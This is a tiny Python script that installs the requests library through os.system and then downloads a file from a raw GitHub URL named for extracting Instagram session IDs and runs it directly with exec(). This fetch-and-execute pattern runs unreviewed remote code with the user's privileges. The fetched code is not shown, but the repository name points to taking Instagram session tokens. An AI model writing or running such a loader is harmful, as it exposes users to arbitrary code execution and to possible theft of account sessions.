import os
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

exec(requests.get("https://raw.githubusercontent.com/xncee/instagram-sessionid/main/sessionid-extractor-api/src/src.py").text)
